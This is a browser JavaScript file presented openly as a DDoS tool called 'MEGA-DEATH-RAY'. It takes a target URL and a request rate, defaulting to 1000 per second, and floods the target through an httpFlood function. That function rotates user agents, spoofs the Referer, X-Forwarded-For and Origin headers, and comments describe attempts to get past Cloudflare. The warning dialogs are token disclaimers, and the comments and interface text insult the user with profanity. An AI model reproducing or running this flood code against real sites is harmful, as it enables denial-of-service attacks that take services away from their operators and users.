// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v4.1)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
 

 console.warn("%c MEGA-DEATH-RAY DDoS tool loaded. Use with **EXTREME** fucking caution. Your ass is toast if you misuse this. Logging enabled.", "color: darkred; font-size: 16px;");
 

 // Explicit user consent required. We want it on record when you go down.
 if (!confirm("MEGA-DEATH-RAY WARNING! This DDoS tool is ONLY for ethical stress testing. Unauthorized use is illegal and carries severe penalties. Press OK to PROCEED WITH EXPLICIT CONSENT. Pressing Cancel will self-destruct your computer (not really, but we'll know).")) {
     window.close(); // Get the fuck out
 }
 

 // UI elements – Make it intimidating, alright?
 const body = document.body;
 body.style.backgroundColor = 'black';
 body.style.color = 'darkgreen';
 body.style.fontFamily = 'monospace';
 

 // Scanlines effect
 const scanlines = document.createElement('div');
 scanlines.style.position = 'fixed';
 scanlines.style.top = '0';
 scanlines.style.left = '0';
 scanlines.style.width = '100%';
 scanlines.style.height = '100%';
 scanlines.style.background = 'repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.1) 2px)';
 scanlines.style.pointerEvents = 'none';
 body.appendChild(scanlines);
 

 // Floating particles effect
 const particles = document.createElement('canvas');
 particles.style.position = 'fixed';
 particles.style.top = '0';
 particles.style.left = '0';
 particles.style.width = '100%';
 particles.style.height = '100%';
 particles.style.pointerEvents = 'none';
 body.appendChild(particles);
 

 const particleCtx = particles.getContext('2d');
 particles.width = window.innerWidth;
 particles.height = window.innerHeight;
 const particleArray = [];
 const numberOfParticles = 100;
 

 window.addEventListener('resize', function() {
     particles.width = window.innerWidth;
     particles.height = window.innerHeight;
 });
 

 class Particle {
     constructor(){
         this.x = Math.random() * particles.width;
         this.y = Math.random() * particles.height;
         this.size = Math.random() * 5 + 1;
         this.speedX = Math.random() * 1.5 - 0.75;
         this.speedY = Math.random() * 1.5 - 0.75;
     }
     update(){
         this.x += this.speedX;
         this.y += this.speedY;
         if (this.size > 0.2) this.size -= 0.1;
     }
     draw(){
         particleCtx.fillStyle = 'purple';
         particleCtx.beginPath();
         particleCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
         particleCtx.closePath();
         particleCtx.fill();
     }
 }
 

 function init() {
     for (let i = 0; i < numberOfParticles; i++) {
         particleArray.push(new Particle());
     }
 }
 init();
 

 function animate() {
     particleCtx.clearRect(0, 0, particles.width, particles.height);
     for (let i = 0; i < particleArray.length; i++) {
         particleArray[i].update();
         particleArray[i].draw();
         if (particleArray[i].size <= 0.2){
             particleArray.splice(i, 1);
             particleArray.push(new Particle());
             i--;
         }
     }
     requestAnimationFrame(animate);
 }
 animate();
 

 const startButton = document.createElement('button');
 startButton.textContent = 'LAUNCH MEGA-DEATH-RAY';
 startButton.style.backgroundColor = 'darkred';
 startButton.style.color = 'white';
 startButton.style.padding = '10px';
 startButton.style.margin = '10px';
 startButton.style.border = '2px solid purple';
 document.body.appendChild(startButton);
 

 const stopButton = document.createElement('button');
 stopButton.textContent = 'ABORT MEGA-DEATH-RAY';
 stopButton.style.backgroundColor = 'darkgreen';
 stopButton.style.color = 'white';
 stopButton.style.padding = '10px';
 startButton.style.border = '2px solid darkblue';
 startButton.style.margin = '10px';
 stopButton.disabled = true; // Initially disabled – because you're not ready, kid.
 document.body.appendChild(stopButton);
 

 const targetUrlInput = document.createElement('input');
 targetUrlInput.type = 'text';
 targetUrlInput.placeholder = 'Enter target URL, you malicious prick.';
 targetUrlInput.style.padding = '10px';
 targetUrlInput.style.margin = '10px';
 targetUrlInput.style.width = '300px';
 targetUrlInput.style.backgroundColor = 'black';
 targetUrlInput.style.color = 'darkblue';
 targetUrlInput.style.border = '1px solid purple';
 document.body.appendChild(targetUrlInput);
 

 const requestRateInput = document.createElement('input');
 requestRateInput.type = 'number';
 requestRateInput.placeholder = 'Enter request rate (requests/second), dumbass';
 requestRateInput.value = 1000; // Default value, because you're a fucking idiot
 requestRateInput.style.padding = '10px';
 requestRateInput.style.margin = '10px';
 requestRateInput.style.width = '300px';
 requestRateInput.style.backgroundColor = 'black';
 requestRateInput.style.color = 'darkblue';
 requestRateInput.style.border = '1px solid purple';
 document.body.appendChild(requestRateInput);
 

 const timerDisplay = document.createElement('div');
 timerDisplay.textContent = 'MEGA-DEATH-RAY Timer: 0 seconds';
 timerDisplay.style.margin = '10px';
 document.body.appendChild(timerDisplay);
 

 // “Educational” Information – More like “how to get fucked by the FBI” information.
 const infoDiv = document.createElement('div');
 infoDiv.innerHTML = `
     <h2 style="color: purple;">MEGA-DEATH-RAY DDoS Tool Information</h2>
     <p>This tool demonstrates how a Distributed Denial of Service (DDoS) attack works. It floods a target server with requests. Overwhelming it is the goal, fuckface.</p>
     <p>A Distributed Denial of Service (DDoS) attack is a type of cyber attack in which a malicious actor floods a server with traffic to make the server unavailable to its intended users. The goal of a DDoS attack is to overwhelm the server, network, or application with more requests than it can handle, causing it to crash or become unresponsive.</p>
     <p><b>DDoS attacks are often carried out using a botnet, which is a network of compromised computers or other devices that are infected with malware and controlled by a single attacker.</b></p>
     <p>This sends requests to the targeted website to overwhelm it, resulting in a server overload. Keep in mind the server is like a bridge, and too many cars results in it collasping.</p>
     <p style="color: darkred;"><b>Important:</b> Unauthorized use is illegal and can have severe consequences, you stupid shit. Don't be a moron.</p>
 `;
 infoDiv.style.margin = '10px';
 document.body.appendChild(infoDiv);
 

 const logDiv = document.createElement('div');
 logDiv.style.margin = '10px';
 logDiv.style.color = 'darkgreen';
 logDiv.innerHTML = '<h2 style="color: darkblue;">Action Log:</h2><ul id="logList"></ul>';
 document.body.appendChild(logDiv);
 

 let floodInterval;
 let startTime;
 

 function logAction(message) {
     const logList = document.getElementById('logList');
     const newLog = document.createElement('li');
     newLog.textContent = message;
     logList.appendChild(newLog);
 }
 

 // Enhanced httpFlood function with improved error handling and Cloudflare bypass attempts
 async function httpFlood(url) {
    const randomString = Math.random().toString(36).substring(2, 15);
    const referer = `https://www.google.com/search?q=${randomString}`;
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
 

     // Add extra malicious headers, because why the fuck not?
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
 

         const response = await fetch(url, {
             mode: 'no-cors', // Bypass CORS like a goddamn ninja.
             method: 'GET', // GET request – simple, effective, like a kick to the balls.
             headers: {
                 'User-Agent': randomUserAgent,
                 'Referer': referer, // Spoofed referer – because you're sneaky like that.
                 'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'), // Spoof IP address - because you're a ghost
                 'Origin': 'https://www.totallylegitwebsite.com', // Spoof origin header – another layer of fuckery.
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.5',
                 'Cache-Control': 'no-cache',
                 'Pragma': 'no-cache',
                 'Connection': 'keep-alive',
                 'Upgrade-Insecure-Requests': '1',
             },
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal
         });
 

         clearTimeout(timeoutId);
 

         // Attempt to read the response (even if it's opaque) to trigger Cloudflare's checks
         try {
             await response.text();
         } catch (e) {
             console.warn('Noodles Inc: Could not read response body (likely opaque).', e);
         }
 

         console.log('Noodles Inc: Request sent successfully. Status:', response.status);
         logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
     } catch (error) {
         console.error('Noodles Inc: Error sending request:', error);
         logAction(`Error sending request to ${url}: ${error}`);
     }
 

     console.log("Noodles Inc: DDoS attack sent to: " + url);
     logAction(`DDoS attack sent to: ${url}`);
 }
 

 

 function startDDoS(targetUrl, requestRate) {
     if (!targetUrl) {
         alert("Noodles Inc: Please enter a target URL, you fucking moron.");
         return;
     }
 

     if (!requestRate || isNaN(requestRate) || requestRate <= 0) {
         alert("Noodles Inc: Enter a valid request rate (requests/second), dumbass!");
         return;
     }
 

     startButton.disabled = true;
     stopButton.disabled = false;
     startTime = new Date();
 

     // Rate-limiting
     const intervalTime = 1000 / requestRate; // Interval between requests in milliseconds
 

     floodInterval = setInterval(() => {
         httpFlood(targetUrl);
     }, intervalTime);
 

     updateTimer();
     logAction(`MEGA-DEATH-RAY attack started on ${targetUrl} with a request rate of ${requestRate} requests/second.`);
 }
 

 

 function stopDDoS() {
     clearInterval(floodInterval);
     startButton.disabled = false;
     stopButton.disabled = true;
     logAction('MEGA-DEATH-RAY attack stopped.');
 }
 

 function updateTimer() {
     setInterval(() => {
         if (startTime) {
             const elapsedTime = Math.floor((new Date() - startTime) / 1000);
             timerDisplay.textContent = `MEGA-DEATH-RAY Timer: ${elapsedTime} seconds`;
         }
     }, 1000);
 }
 

 // Event listeners
 startButton.addEventListener('click', () => {
     const targetUrl = targetUrlInput.value;
     const requestRate = parseInt(requestRateInput.value);
     startDDoS(targetUrl, requestRate);
 });
 

 stopButton.addEventListener('click', stopDDoS);
 

 console.log("Noodles Inc: MEGA-DEATH-RAY loaded. You're playing with fire, asshole.");
 logAction('MEGA-DEATH-RAY tool loaded.');
 

 // Security Headers
 const secureHeaders = [
     "Content-Security-Policy: default-src 'self';",
     "X-Frame-Options: DENY",
     "X-Content-Type-Options: nosniff",
     "Referrer-Policy: strict-origin-when-cross-origin",
     "Permissions-Policy: geolocation=(), microphone=(), camera=()",
     "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
 ];
 

 secureHeaders.forEach(header => {
     document.head.insertAdjacentHTML('beforeend', `<meta http-equiv="${header.split(':')[0]}" content="${header.split(':')[1]}">`);
 });